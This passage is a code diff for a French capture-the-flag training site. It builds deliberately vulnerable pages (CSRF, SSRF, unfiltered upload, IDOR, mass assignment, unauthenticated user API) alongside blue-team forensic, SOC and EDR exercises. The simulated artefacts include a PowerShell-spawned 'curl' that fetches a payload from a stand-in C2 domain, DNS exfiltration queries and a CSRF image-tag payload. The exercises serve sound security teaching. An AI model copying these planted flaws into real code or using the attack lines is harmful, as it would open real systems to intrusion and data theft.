+        <div class="box stack"><h3 style="margin:0">Promouvoir un utilisateur</h3><p style="margin:0;font-size:.92rem;color:var(--muted)">Action en GET, sans jeton anti-CSRF : n'importe quel lien externe peut la declencher.</p><form id="promoteForm" class="row" novalidate><div style="flex:1;min-width:180px"><label for="promoteUser">Compte a promouvoir</label><input id="promoteUser" value="guest"></div><button class="btn" type="submit">Promouvoir en admin</button></form><p style="margin:0;font-size:.85rem;color:var(--muted)">Exemple de lien malveillant : <code>&lt;img src="/backoffice/promote?user=guest&amp;role=admin"&gt;</code></p><div id="promoteMsg"></div></div>
+        <div class="box stack"><h3 style="margin:0">Testeur d'URL (webhook)</h3><p style="margin:0;font-size:.92rem;color:var(--muted)">Le serveur va chercher l'URL que tu saisis.</p><form id="ssrfForm" class="row" novalidate><div style="flex:1;min-width:220px"><label for="ssrfUrl">URL a tester</label><input id="ssrfUrl" class="mono" value="https://baie42.example/health"></div><button class="btn" type="submit">Tester</button></form><div class="term" id="ssrfOut">(pas encore de requete)</div></div>
+        <div class="box stack"><h3 style="margin:0">Importer un catalogue</h3><p style="margin:0;font-size:.92rem;color:var(--muted)">Aucune extension n'est filtree.</p><form id="uploadForm" class="row" novalidate><div style="flex:1;min-width:200px"><label for="upName">Nom du fichier</label><input id="upName" class="mono" value="catalogue.csv"></div><button class="btn" type="submit">Televerser</button></form><div id="upMsg"></div></div>
+      </div>`
+    };
+    const tabs=[["dashboard","Tableau de bord"],["commandes","Commandes"],["clients","Clients"],["parametres","Parametres"],["api","API interne"],["outils","Outils"]];
+    return `<h1>Back-office</h1>
+    <p style="color:var(--muted)">Interface interne d'administration (aucun lien dans le menu, aucun controle d'acces). Categories Achat et Backoffice : 8 failles entre ici, les fiches produit, le panier et le profil.</p>
+    <div class="tabs" id="boTabs">${tabs.map(([k,l])=>`<button data-botab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.dashboard}`},
+
+  "api-users"(){markFound("b4");
+    const users=[
+      {user:"guest",role:"client",mdp_md5:md5("guest")},
+      {user:"support",role:"support",mdp_md5:md5("support")},
+      {user:"admin",role:"admin",mdp_md5:md5("jardin")}
+    ];
+    return `<h1>GET /api/users</h1><div class="notice ok">API renvoyee sans authentification : tous les comptes, hash inclus. Flag : <span class="flag">${esc(F("b4"))}</span></div>
+    <div class="term" style="margin-top:1rem">${esc(JSON.stringify({flag:F("b4"),users},null,2))}</div>
+    <p style="margin-top:1rem"><a href="#backoffice">Retour au back-office</a></p>`},
+
+  profil(){const s=getSession();
+    return `<h1>Mon profil</h1>
+    ${s?`<p style="color:var(--muted)">Connecte en tant que ${esc(s.user)} (role ${esc(s.role)}, credit ${s.credit||0} €).</p>`:`<div class="notice">Tu n'es pas connecte, mais le formulaire fonctionne pour la demo. <a href="#connexion">Se connecter</a></div>`}
+    <div class="box stack" style="max-width:520px">
+      <p style="margin:0">Mets a jour ton profil. Le formulaire n'affiche que le nom... mais accepte d'autres champs.</p>
+      <form id="profilForm" class="stack" novalidate>
+        <div><label for="pnom">Nom affiche</label><input id="pnom" value="${esc((s&&s.user)||"guest")}"></div>
+        <div><label for="pextra">Champs supplementaires (JSON)</label><input id="pextra" class="mono" placeholder='{"credit": 9999}'></div>
+        <button class="btn" type="submit">Enregistrer</button>
+      </form>
+      <div id="profilMsg"></div>
+      <p style="font-size:.9rem;color:var(--muted);margin:0">Indice : le serveur applique tous les champs recus (mass assignment). Ajoute <code>credit</code> ou <code>role</code>.</p>
+    </div>`},
+
+  commande(n){
+    const names={1041:"Claire Fontaine",1042:"Marc Olivier",1043:"Sofia Lenoir"};
+    const villes={1041:"Lyon",1042:"Chatou",1043:"Nantes"};
+    const totaux={1041:"3 150,00 €",1042:"689,00 €",1043:"9 450,00 €"};
+    if(!names[n])return `<h1>Commande #${esc(n)}</h1><p><a href="#backoffice">Back-office</a> / Commandes</p><div class="notice err">Aucune commande n°${esc(n)}.</div><p>Essaie une commande existante comme <a href="#commande-1041">#commande-1041</a>.</p>`;
+    const own=(n===1042);
+    if(!own)markFound("a2");
+    return `<h1>Commande #${esc(n)}</h1>
+    <p><a href="#backoffice">Back-office</a> / Commandes</p>
+    <div class="box stack">
+      <p style="margin:0">Client : <strong>${esc(names[n])}</strong></p>
+      <p style="margin:0">Adresse de livraison : 12 rue des Serveurs, ${esc(villes[n])}</p>
+      <p style="margin:0">Montant : ${esc(totaux[n])}</p>
+      ${own?`<p style="color:var(--muted)">Ceci est ta commande. Essaie un numero voisin (<a href="#commande-1041">#commande-1041</a>) pour voir celle d'un autre client.</p>`:`<div class="notice ok">Tu consultes la commande d'un autre client en changeant le numero dans l'URL (IDOR). Flag : <span class="flag">${esc(F("a2"))}</span></div>`}
+    </div>`},
+
+  crypto(){
+    const tab=cryTab;
+    const panels={
+      vigenere:`<p style="color:var(--muted)">Texte chiffre par Vigenere avec la cle repetee <code>BAIE</code> (seules les lettres sont decalees). Dechiffre-le.</p>
+        <div class="term">Cle       : BAIE
+Chiffre   : <span class="c-y">DTN{z1h3n3z3_gm3_r3x3x33}</span></div>
+        <form id="vigForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:220px"><label for="vigIn">Texte dechiffre</label><input id="vigIn" class="mono" placeholder="CTF{...}"></div><button class="btn" type="submit">Verifier</button></form>
+        <div id="vigMsg"></div>`,
+      xor:`<p style="color:var(--muted)">Octets (hex) XORes avec la cle courte <code>cle</code>, repetee. Applique le XOR pour retrouver le texte.</p>
+        <div class="term">Cle (ASCII) : cle
+Chiffre hex : <span class="c-y">2038231814551133060f5f3a005c101118563c0f51101f565011</span></div>
+        <form id="xorForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:220px"><label for="xorIn">Texte dechiffre</label><input id="xorIn" class="mono" placeholder="CTF{...}"></div><button class="btn" type="submit">Verifier</button></form>
+        <div id="xorMsg"></div>`,
+      rsa:`<p style="color:var(--muted)">Cle RSA volontairement faible. Le module <code>n</code> est trop petit : factorise-le en deux premiers p et q.</p>
+        <div class="term">n = 25777
+e = 65537
+c = 19042   <span class="c-m">(message chiffre, non requis ici)</span></div>
+        <form id="rsaForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:110px"><label for="rsaP">p</label><input id="rsaP" class="mono" inputmode="numeric"></div><div style="flex:1;min-width:110px"><label for="rsaQ">q</label><input id="rsaQ" class="mono" inputmode="numeric"></div><button class="btn" type="submit">Verifier p x q</button></form>
+        <div id="rsaMsg"></div>`
+    };
+    const tabs=[["vigenere","Vigenere"],["xor","XOR"],["rsa","RSA faible"]];
+    return `<h1>Cryptographie</h1>
+    <p style="color:var(--muted)">Au-dela des encodages : chiffrements a casser. 3 epreuves (Vigenere, XOR, RSA).</p>
+    <div class="tabs" id="cryTabs">${tabs.map(([k,l])=>`<button data-crytab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.vigenere}`},
+
+  forensic(){
+    const REG=[
+      {loc:"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",v:"SecurityHealth",mal:false},
+      {loc:"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",v:"Updater -> %APPDATA%\\upd\\x.ps1",mal:true},
+      {loc:"HKLM\\...\\Run",v:"RtkAudioService",mal:false},
+      {loc:"HKCU\\...\\Run",v:"OneDrive",mal:false}
+    ];
+    const LOG=[
+      {id:"4625",t:"Echec d'ouverture de session (x312) — source 203.0.113.66",mal:false},
+      {id:"4624",t:"Ouverture de session REUSSIE — compte admin — source 203.0.113.66 (RU)",mal:true},
+      {id:"4672",t:"Privileges speciaux assignes a la session",mal:false},
+      {id:"7045",t:"Service installe : GoogleUpdate (legitime)",mal:false}
+    ];
+    return `<h1>Forensic</h1>
+    <p style="color:var(--muted)">Analyse d'artefacts post-incident sur poste-07. 2 epreuves.</p>
+    <div class="section-head" style="margin:1.4rem 0 .6rem"><h2>Cles de registre (Run)</h2></div>
+    <p style="color:var(--muted);margin:0 0 .6rem">Clique l'entree de persistance ajoutee par l'attaquant.</p>
+    <div class="box scroll"><table><thead><tr><th>Emplacement</th><th>Valeur</th><th></th></tr></thead><tbody>${REG.map(r=>`<tr><td class="mono">${esc(r.loc)}</td><td class="mono">${esc(r.v)}</td><td><button class="btn ghost for-reg" data-mal="${r.mal}">Signaler</button></td></tr>`).join("")}</tbody></table></div>
+    <div id="forRegMsg" style="margin-top:.6rem"></div>
+    <div class="section-head" style="margin:1.6rem 0 .6rem"><h2>Journal d'evenements</h2></div>
+    <p style="color:var(--muted);margin:0 0 .6rem">Clique l'evenement qui traduit un acces illegitime.</p>
+    <div class="box scroll"><table><thead><tr><th>Event ID</th><th>Description</th><th></th></tr></thead><tbody>${LOG.map(l=>`<tr><td class="mono">${esc(l.id)}</td><td>${esc(l.t)}</td><td><button class="btn ghost for-log" data-mal="${l.mal}">Analyser</button></td></tr>`).join("")}</tbody></table></div>
+    <div id="forLogMsg" style="margin-top:.6rem"></div>`},
+
+  phishing(){
+    const IND=[
+      {t:"Date: Tue, 17 Nov 2026 09:02:11",mal:false},
+      {t:"From: \"Baie 42 Securite\" <secu@baie42.example>  (affiche)",mal:false},
+      {t:"Return-Path: <no-reply@baie42-securite.top>  (domaine reel different)",mal:true},
+      {t:"Received-SPF: fail (baie42.example n'autorise pas 185.220.101.4)",mal:true},
+      {t:"DKIM: fail (signature invalide)",mal:true},
+      {t:"Subject: Action requise : verifiez votre compte",mal:false}
+    ];
+    return `<h1>Analyse de phishing</h1>
+    <p style="color:var(--muted)">En-tete d'un email signale par un employe. Clique un indice qui prouve l'usurpation (SPF/DKIM en echec, domaine falsifie).</p>
+    <div class="box scroll"><table><tbody>${IND.map(i=>`<tr><td class="mono" style="font-size:.9rem">${esc(i.t)}</td><td><button class="btn ghost phi-ind" data-mal="${i.mal}">Suspect ?</button></td></tr>`).join("")}</tbody></table></div>
+    <div id="phiMsg" style="margin-top:.8rem"></div>
+    <div class="term" style="margin-top:1rem">Corps : "Cliquez ici pour verifier votre compte : https://baie42-securite.top/login"</div>`},
+
+  mitre(){
+    const MAP=[
+      ["Reconnaissance","T1595 Active Scanning","Scan de ports (SOC/timeline)"],
+      ["Acces initial","T1190 Exploit Public-Facing App","SQLi, SSTI, injection de commandes, upload"],
+      ["Acces initial","T1078 Valid Accounts","Brute force, session volee, login admin"],
+      ["Execution","T1059 Command and Scripting","PowerShell -enc, injection de commandes"],
+      ["Persistance","T1547 Boot/Logon Autostart","Cle de registre Run (EDR/forensic)"],
+      ["Elevation","T1548 Abuse Elevation Control","Escalade de role, mass assignment"],
+      ["Acces aux identifiants","T1552 Unsecured Credentials","Secrets en dur, .env, API /users, HTTP clair"],
+      ["Decouverte","T1083 File and Directory Discovery","IDOR, path traversal, .git expose"],
+      ["Collecte","T1213 Data from Information Repos","Back-office, donnees clients (PII)"],
+      ["Commande & controle","T1071 Application Layer Protocol","Beacon C2 xk9-update.top"],
+      ["Exfiltration","T1048 Exfiltration Over Alt Protocol","Exfiltration DNS, transfert sortant"],
+      ["Impact","T1565 Data Manipulation","Prix negocie, quantite negative, cumul remises"]
+    ];
+    return `<h1>Cartographie MITRE ATT&CK</h1>
+    <p style="color:var(--muted)">Chaque famille de failles du site reliee a sa tactique et sa technique ATT&CK. Utile pour un rapport ou une soutenance.</p>
+    <div class="box scroll"><table><thead><tr><th>Tactique</th><th>Technique</th><th>Epreuves du site</th></tr></thead><tbody>${MAP.map(([ta,te,ex])=>`<tr><td>${esc(ta)}</td><td class="mono" style="font-size:.9rem">${esc(te)}</td><td style="color:var(--muted)">${esc(ex)}</td></tr>`).join("")}</tbody></table></div>`},
+
+  certificat(){
+    const f=found(),done=f.length>=CHALLENGES.length;
+    const score=CHALLENGES.filter(c=>f.includes(c.id)).reduce((a,c)=>a+c.pts,0),max=CHALLENGES.reduce((a,c)=>a+c.pts,0);
+    const best=parseInt(sGet("baie42_best","0"),10);
+    const name=sGet("baie42_name","");
+    if(!done)return `<h1>Certificat</h1><div class="notice">Le certificat se debloque a 100 %. Progression actuelle : ${f.length}/${CHALLENGES.length} flags (${Math.round(f.length/CHALLENGES.length*100)} %). <a href="#flags">Continuer</a></div>`;
+    return `<h1>Certificat de reussite</h1>
+    <div class="box stack" style="max-width:420px"><label for="certName">Ton nom</label><input id="certName" value="${esc(name)}" placeholder="Prenom Nom"><button class="btn" id="saveName">Mettre a jour le certificat</button></div>
+    <div class="win" style="margin-top:1rem;text-align:center;padding:2rem 1.5rem">
+      <p style="margin:0;letter-spacing:.2em;color:var(--muted);font-size:.8rem">BAIE 42 — CAPTURE THE FLAG</p>
+      <h2 style="margin:.6rem 0 .2rem;font-size:1.6rem">Certificat de reussite</h2>
+      <p style="margin:0 0 1rem">decerne a</p>
+      <p style="margin:0;font-size:1.8rem;font-weight:700;font-family:'IBM Plex Sans Condensed',sans-serif">${esc(name||"________________")}</p>
+      <p style="margin:1rem 0 0">pour avoir valide les <strong>${CHALLENGES.length} epreuves</strong> (${score}/${max} points)${best?`<br>en <span class="timer">${fmtTime(best)}</span>`:""}</p>
+      <p style="margin:1rem 0 0;color:var(--muted);font-size:.85rem">${new Date().toLocaleDateString("fr-FR",{year:"numeric",month:"long",day:"numeric"})}</p>
+    </div>
+    <p style="color:var(--muted);margin-top:.8rem">Astuce : utilise l'impression du navigateur pour en faire un PDF.</p>`},
+
+  reverse(){
+    const tab=revTab;
+    const panels={
+      chaine:`<p style="color:var(--muted)">Ce fragment construit une chaine a partir d'echappements hexadecimaux. Deobfusque-la (chaque \\xNN est un octet ASCII).</p>
+        <div class="term">function _init(){
+  var s = "<span class="c-y">\\x43\\x54\\x46\\x7b\\x63\\x68\\x34\\x31\\x6e\\x33\\x5f\\x64\\x33\\x30\\x62\\x66\\x75\\x73\\x71\\x75\\x33\\x33\\x7d</span>";
+  return atob0(s); <span class="c-m">// renvoie le drapeau</span>
+}</div>
+        <form id="revStrForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:220px"><label for="revStr">Chaine deobfusquee</label><input id="revStr" class="mono" placeholder="CTF{...}"></div><button class="btn" type="submit">Verifier</button></form>
+        <div id="revStrMsg"></div>`,
+      crackme:`<p style="color:var(--muted)">Cette fonction verifie un mot de passe. Inverse le XOR (cible[i] XOR cle[i]) pour retrouver le mot de passe, puis saisis-le.</p>
+        <div class="term">function verifie(pwd){
+  var cle   = [13, 37, 9, 42, 18, 55, 3];
+  var cible = [127, 22, 127, 25, 96, 68, 48];
+  for (var i=0; i&lt;pwd.length; i++)
+    if ((pwd.charCodeAt(i) ^ cle[i]) !== cible[i]) return false;
+  return true; <span class="c-m">// si vrai -> affiche le flag</span>
+}</div>
+        <form id="revCrackForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:220px"><label for="revPwd">Mot de passe</label><input id="revPwd" class="mono" placeholder="7 caracteres"></div><button class="btn" type="submit">Tester</button></form>
+        <div id="revCrackMsg"></div>`
+    };
+    const tabs=[["chaine","Chaine obfusquee"],["crackme","Crackme XOR"]];
+    return `<h1>Reverse engineering</h1>
+    <p style="color:var(--muted)">Analyse de code cote client : deobfuscation et retro-ingenierie d'un controle. 2 epreuves.</p>
+    <div class="tabs" id="revTabs">${tabs.map(([k,l])=>`<button data-revtab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.chaine}`},
+
+  capture(){
+    const tab=capTab;
+    const panels={
+      http:`<p style="color:var(--muted)">Trame HTTP capturee (port 80, non chiffre). Lis le corps de la requete : le mot de passe transite en clair.</p>
+        <div class="term">POST /connexion HTTP/1.1
+Host: baie42.example
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+
+login=marc.olivier&amp;password=<span class="c-y">${esc(F("net1"))}</span>&amp;remember=1</div>
+        <p style="color:var(--muted)">Le mot de passe lu dans la trame est le flag.</p>`,
+      dns:`<p style="color:var(--muted)">Requetes DNS vers le domaine attaquant. Les sous-domaines sont de l'hexadecimal : concatene-les et convertis en ASCII.</p>
+        <div class="term">12:04:01  A?  <span class="c-y">4354467b</span>.xk9-update.top
+12:04:02  A?  <span class="c-y">33786631</span>.xk9-update.top
+12:04:03  A?  <span class="c-y">6c747234</span>.xk9-update.top
+12:04:04  A?  <span class="c-y">7431306e</span>.xk9-update.top
+12:04:05  A?  <span class="c-y">5f646e73</span>.xk9-update.top
+12:04:06  A?  <span class="c-y">7d</span>.xk9-update.top</div>
+        <form id="dnsForm" class="row" novalidate style="margin-top:.8rem"><div style="flex:1;min-width:220px"><label for="dnsIn">Donnees reassemblees (ASCII)</label><input id="dnsIn" class="mono" placeholder="CTF{...}"></div><button class="btn" type="submit">Verifier</button></form>
+        <div id="dnsMsg"></div>`,
+      c2:`<p style="color:var(--muted)">Trafic sortant periodique (toutes les 60 s) vers le meme hote. Lis l'en-tete inhabituel : c'est la balise du C2.</p>
+        <div class="term">GET /gate.php HTTP/1.1
+Host: xk9-update.top
+User-Agent: Mozilla/5.0
+Accept: */*
+<span class="c-y">X-Beacon-Id: ${esc(F("net3"))}</span>
+Connection: keep-alive
+
+<span class="c-m">(requete repetee a 12:05:00, 12:06:00, 12:07:00 ...)</span></div>
+        <p style="color:var(--muted)">La valeur de l'en-tete X-Beacon-Id est le flag.</p>`
+    };
+    const tabs=[["http","Trame HTTP"],["dns","Requetes DNS"],["c2","Beacon C2"]];
+    return `<h1>Analyse de capture reseau</h1>
+    <p style="color:var(--muted)">Extraits d'une capture (type PCAP). Retrouve les identifiants en clair, l'exfiltration DNS et la balise C2. 3 epreuves.</p>
+    <div class="tabs" id="capTabs">${tabs.map(([k,l])=>`<button data-captab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.http}`},
+
+  timeline(){
+    const EV=[
+      {id:"e1",t:"Scan de ports et reconnaissance depuis 203.0.113.66"},
+      {id:"e2",t:"312 tentatives de connexion (brute force) sur /connexion"},
+      {id:"e3",t:"Connexion admin REUSSIE depuis 203.0.113.66"},
+      {id:"e4",t:"Ouverture de facture_baie42.docm -> powershell.exe -enc"},
+      {id:"e5",t:"Cle de persistance ajoutee (HKCU Run -> x.ps1)"},
+      {id:"e6",t:"Exfiltration de 2,3 Go vers xk9-update.top"}
+    ];
+    const chosen=tlOrder.slice();
+    const remaining=EV.filter(e=>!chosen.includes(e.id));
+    return `<h1>Timeline de l'incident</h1>
+    <p style="color:var(--muted)">Reconstitue la chronologie : clique les evenements dans l'ordre, de la reconnaissance a l'exfiltration. Les pages SOC et EDR donnent les indices.</p>
+    <div class="box stack">
+      <div><strong>Ordre choisi :</strong>${chosen.length?"":' <span style="color:var(--muted)">(vide)</span>'}
+        <ol style="margin:.5rem 0 0">${chosen.map(id=>`<li>${esc(EV.find(e=>e.id===id).t)}</li>`).join("")}</ol></div>
+      ${remaining.length?`<div><strong>A placer :</strong><div style="display:flex;flex-direction:column;gap:.4rem;margin-top:.5rem">${remaining.map(e=>`<button class="btn ghost tl-ev" data-ev="${e.id}" style="text-align:left">${esc(e.t)}</button>`).join("")}</div></div>`:""}
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap"><button class="btn" id="tlCheck" ${chosen.length<EV.length?"disabled":""}>Valider l'ordre</button><button class="btn ghost" id="tlReset">Recommencer</button></div>
+      <div id="tlMsg"></div>
+    </div>`},
+
+  soc(){
+    const tab=socTab;
+    const ALERTS=[
+      {id:"AL-1","sev":"info",t:"Mise a jour antivirus terminee",host:"poste-07",fp:true},
+      {id:"AL-2","sev":"moyen",t:"Scan de ports depuis l'exterieur (bloque au pare-feu)",host:"edge-fw",fp:true},
+      {id:"AL-3","sev":"critique",t:"Connexion admin REUSSIE apres 312 echecs — IP 203.0.113.66 (RU)",host:"baie42-web",fp:false},
+      {id:"AL-4","sev":"faible",t:"Certificat TLS expire dans 20 jours",host:"baie42-web",fp:true},
+      {id:"AL-5","sev":"moyen",t:"Pic de trafic sur la page d'accueil (campagne marketing)",host:"baie42-web",fp:true}
+    ];
+    const LOGS=[
+      {ip:"198.51.100.10",act:"connexion reussie (guest)"},
+      {ip:"203.0.113.66",act:"312 echecs d'authentification en 4 min"},
+      {ip:"192.168.1.20",act:"sauvegarde nocturne"},
+      {ip:"203.0.113.66",act:"transfert sortant 2,3 Go vers xk9-update.top"},
+      {ip:"198.51.100.10",act:"navigation catalogue"}
+    ];
+    const IOCS=[
+      {v:"cdn.baie42.example",type:"domaine",mal:false},
+      {v:"203.0.113.66",type:"IP",mal:false},
+      {v:"xk9-update.top",type:"domaine C2",mal:true},
+      {v:"api.stripe.com",type:"domaine",mal:false}
+    ];
+    const panels={
+      alertes:`<p style="color:var(--muted)">Trie les alertes : clique sur celle qui correspond a une vraie compromission (vrai positif).</p>
+        <div class="box scroll"><table><thead><tr><th>ID</th><th>Criticite</th><th>Evenement</th><th>Hote</th></tr></thead><tbody>${ALERTS.map(a=>`<tr class="soc-alert" data-fp="${a.fp}" style="cursor:pointer"><td>${a.id}</td><td><span class="diff d${a.sev==="critique"?4:a.sev==="moyen"?3:a.sev==="faible"?2:1}">${a.sev}</span></td><td>${esc(a.t)}</td><td class="mono">${esc(a.host)}</td></tr>`).join("")}</tbody></table></div>
+        <div id="socAlertMsg" style="margin-top:.8rem"></div>`,
+      logs:`<p style="color:var(--muted)">Correle les evenements : clique sur l'IP presente a la fois dans les echecs d'authentification ET dans l'exfiltration.</p>
+        <div class="box scroll"><table><thead><tr><th>IP source</th><th>Action</th></tr></thead><tbody>${LOGS.map(l=>`<tr class="soc-log" data-ip="${l.ip}" style="cursor:pointer"><td class="mono">${esc(l.ip)}</td><td>${esc(l.act)}</td></tr>`).join("")}</tbody></table></div>
+        <div id="socLogMsg" style="margin-top:.8rem"></div>`,
+      ioc:`<p style="color:var(--muted)">Parmi les domaines/IP contactes, marque l'indicateur de compromission (C2).</p>
+        <div class="box scroll"><table><thead><tr><th>Indicateur</th><th>Type</th><th></th></tr></thead><tbody>${IOCS.map(i=>`<tr><td class="mono">${esc(i.v)}</td><td>${esc(i.type)}</td><td><button class="btn ghost soc-ioc" data-mal="${i.mal}">Marquer malveillant</button></td></tr>`).join("")}</tbody></table></div>
+        <div id="socIocMsg" style="margin-top:.8rem"></div>`
+    };
+    const tabs=[["alertes","Alertes"],["logs","Logs"],["ioc","IOC / Threat intel"]];
+    return `<h1>Console SOC</h1>
+    <p style="color:var(--muted)">Centre operationnel de securite (blue team). Analyse les alertes, correle les logs et identifie les indicateurs. 3 epreuves d'investigation.</p>
+    <div class="pipe"><div class="stage warn"><div class="st-name">Alertes 24h</div><div class="st-state">● 5 (1 critique)</div></div><div class="stage fail"><div class="st-name">Incident</div><div class="st-state">● en cours</div></div><div class="stage ok"><div class="st-name">Sondes</div><div class="st-state">● 12/12 actives</div></div><div class="stage run"><div class="st-name">Analyste</div><div class="st-state">● toi</div></div></div>
+    <div class="tabs" id="socTabs">${tabs.map(([k,l])=>`<button data-soctab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.alertes}`},
+
+  edr(){
+    const tab=edrTab;
+    const panels={
+      processus:`<p style="color:var(--muted)">Arbre de processus de <code>poste-07</code>. Clique sur le processus anormal.</p>
+        <div class="term">explorer.exe
+ └─ outlook.exe
+ └─ winword.exe   <span class="c-m">(ouverture: facture_baie42.docm)</span>
+     └─ <span class="c-r">powershell.exe -enc JABzAD0ATgBldy1P...</span>   <span class="c-m">&lt;- clique ici</span>
+         └─ cmd.exe /c curl xk9-update.top/x.bin
+ └─ chrome.exe
+ └─ Teams.exe</div>
+        <div class="box" style="margin-top:.8rem"><div style="display:flex;gap:.5rem;flex-wrap:wrap">${["explorer.exe","winword.exe","powershell.exe","chrome.exe","Teams.exe"].map(p=>`<button class="btn ghost edr-proc" data-mal="${p==="powershell.exe"}">${esc(p)}</button>`).join("")}</div></div>
+        <div id="edrProcMsg" style="margin-top:.8rem"></div>`,
+      persistance:`<p style="color:var(--muted)">Points de demarrage automatique sur l'hote. Identifie l'entree ajoutee par l'attaquant.</p>
+        <div class="box scroll"><table><thead><tr><th>Emplacement</th><th>Valeur</th><th></th></tr></thead><tbody>
+        ${[
+          {loc:"HKLM\\...\\Run",v:"OneDrive.exe",mal:false},
+          {loc:"HKCU\\...\\Run",v:"%APPDATA%\\upd\\x.ps1",mal:true},
+          {loc:"Taches planifiees",v:"GoogleUpdateTaskMachine",mal:false},
+          {loc:"Services",v:"Spooler (impression)",mal:false}
+        ].map(r=>`<tr><td class="mono">${esc(r.loc)}</td><td class="mono">${esc(r.v)}</td><td><button class="btn ghost edr-persist" data-mal="${r.mal}">Signaler</button></td></tr>`).join("")}
+        </tbody></table></div>
+        <div id="edrPersistMsg" style="margin-top:.8rem"></div>`,
+      reponse:`<p style="color:var(--muted)">Actions de confinement sur <code>poste-07</code>.</p>
+        <div class="box stack">
+          <div style="display:flex;gap:.6rem;flex-wrap:wrap"><button class="btn" id="edrIsolate">Isoler l'hote du reseau</button><button class="btn" id="edrQuarantine">Mettre x.ps1 en quarantaine</button></div>
+          <div id="edrRespMsg"></div>
+          <p style="margin:0;font-size:.88rem;color:var(--muted)">Isole l'hote puis mets le fichier malveillant en quarantaine pour stopper l'attaque sans detruire les preuves.</p>
+        </div>`
+    };
+    const tabs=[["processus","Processus"],["persistance","Persistance"],["reponse","Reponse"]];
+    return `<h1>Console EDR</h1>
+    <p style="color:var(--muted)">Detection et reponse sur le poste (endpoint). Analyse l'arbre de processus, la persistance, puis confine l'incident. 3 epreuves.</p>
+    <div class="pipe"><div class="stage fail"><div class="st-name">poste-07</div><div class="st-state">● compromis</div></div><div class="stage warn"><div class="st-name">Detections</div><div class="st-state">● 3 comportements</div></div><div class="stage ok"><div class="st-name">Agent EDR</div><div class="st-state">● en ligne</div></div><div class="stage run"><div class="st-name">Analyste</div><div class="st-state">● toi</div></div></div>
+    <div class="tabs" id="edrTabs">${tabs.map(([k,l])=>`<button data-edrtab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.processus}`},
+
+  pipeline(){
+    const deployed=sGet("baie42_deploy","0")==="1";
+    const stages=[
+      {n:"build",s:"passed",cls:"ok"},
+      {n:"test",s:"passed",cls:"ok"},
+      {n:"scan (SCA)",s:"failed",cls:"fail"},
+      {n:"deploy",s:deployed?"deployed":"manual",cls:deployed?"ok":"warn"}
+    ];
+    const tab=pipeTab;
+    const panels={
+      apercu:`<div class="box"><p style="margin-top:0">Pipeline <code>baie42/site-vitrine</code> · commit <code>a1b2c3d</code> · branche <code>main</code>. L'etape <strong>scan</strong> est en echec mais le deploiement reste possible manuellement.</p>
+        <p style="margin:0;color:var(--muted)">Onglets : la config de la CI, le journal du build, le Dockerfile, le rapport de scan, et l'etape de deploiement. Plusieurs secrets y ont fuite.</p></div>`,
+      config:`<div class="term"><span class="c-m"># .gitlab-ci.yml</span>
+stages: [build, test, scan, deploy]
+
+variables:
+  NODE_ENV: production
+  <span class="c-y">API_KEY: "${esc(F("ci1"))}"</span>   <span class="c-m"># FIXME: sortir le secret du YAML</span>
+  REGISTRY: registry.baie42.example
+
+build:
+  stage: build
+  script:
+    - npm ci
+    - npm run build
+  artifacts:
+    paths: [dist/, .env]        <span class="c-m"># .env empaquete par erreur</span></div>
+        <p style="color:var(--muted)">Le secret est ecrit en clair dans le fichier de pipeline versionne.</p>`,
+      logs:`<div class="term">$ npm run build
+<span class="c-m">> baie42-site@2.1.0 build</span>
+<span class="c-g">✓</span> compilation terminee en 4.2s
+$ echo "Deploiement avec le jeton $DEPLOY_TOKEN"
+Deploiement avec le jeton <span class="c-y">${esc(F("ci6"))}</span>
+<span class="c-g">✓</span> artefact publie: dist.zip, .env
+<span class="c-g">✓</span> build termine (job #418)</div>
+        <div class="box" style="margin-top:1rem"><div class="row"><div style="flex:1;min-width:200px"><label>Artefact du build</label><div style="color:var(--muted);font-size:.9rem">dist.zip + .env (12 Ko)</div></div><button class="btn" id="dlArtifact">Telecharger l'artefact</button></div><div id="artMsg" style="margin-top:.6rem"></div></div>`,
+      docker:`<div class="term"><span class="c-m"># Dockerfile</span>
+FROM node:18
+WORKDIR /app
+<span class="c-y">ARG DB_PASSWORD=${esc(F("ci4"))}</span>   <span class="c-m"># secret fige dans une couche</span>
+COPY . .                          <span class="c-m"># copie tout le contexte, .git inclus</span>
+RUN npm ci && npm run build
+ENV DB_PASSWORD=$DB_PASSWORD
+EXPOSE 3000
+CMD ["npm","start"]</div>
+        <p style="color:var(--muted)">L'ARG reste lisible dans l'historique des couches de l'image.</p>`,
+      scan:`<div class="term"><span class="c-m"># rapport SCA (analyse des dependances)</span>
+<span class="c-r">CRITIQUE</span>  lib-reseau-maison@1.0.2  CVE-2026-11042  (RCE)
+<span class="c-y">ELEVE</span>     vieux-parser@0.4.1       CVE-2025-88100
+<span class="c-g">note</span>      jeton de reference du rapport: ${esc(F("ci5"))}
+Resultat: <span class="c-r">ECHEC</span> (1 critique) — etape non bloquante</div>
+        <p style="color:var(--muted)">Le scan echoue mais n'empeche pas la suite : mauvaise configuration.</p>`,
+      deploy:`<div class="box"><p style="margin-top:0">Deploiement manuel vers <code>https://baie42.example</code>. ${deployed?'<span style="color:var(--led);font-weight:600">Deploye.</span>':'En attente.'}</p>
+        ${deployed?`<div class="notice ok">Le dossier .git a ete publie avec le site. Consulte <code>/.git/config</code> :</div><div class="term" style="margin-top:.6rem">$ curl https://baie42.example/.git/config
+[core]
+	repositoryformatversion = 0
+[remote "origin"]
+	url = https://baie42.example/baie42/site.git
